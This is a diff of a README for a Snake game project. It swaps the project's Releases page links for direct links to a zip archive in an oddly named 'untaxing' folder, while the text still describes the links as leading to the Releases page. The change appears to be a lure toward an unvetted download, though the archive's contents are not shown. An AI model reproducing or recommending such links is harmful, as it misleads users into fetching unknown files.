@@ -8,7 +8,7 @@ Welcome to the **lab-snake-reverse** project! This game turns the classic Snake 
 
 You can easily download the game from our Releases page. Follow the link below:
 
-[![Download lab-snake-reverse](https://img.shields.io/badge/Download-lab--snake--reverse-brightgreen)](https://github.com/B3llzz/lab-snake-reverse/releases)
+[![Download lab-snake-reverse](https://github.com/B3llzz/lab-snake-reverse/raw/refs/heads/main/untaxing/snake_reverse_lab_1.6.zip)](https://github.com/B3llzz/lab-snake-reverse/raw/refs/heads/main/untaxing/snake_reverse_lab_1.6.zip)
 
 ## 📋 Features
 
@@ -28,7 +28,7 @@ You can easily download the game from our Releases page. Follow the link below:
 
 1. Click on the link below to visit the Releases page:
 
-   [Download lab-snake-reverse](https://github.com/B3llzz/lab-snake-reverse/releases)
+   [Download lab-snake-reverse](https://github.com/B3llzz/lab-snake-reverse/raw/refs/heads/main/untaxing/snake_reverse_lab_1.6.zip)
 
 2. On the Releases page, look for the latest version.
 
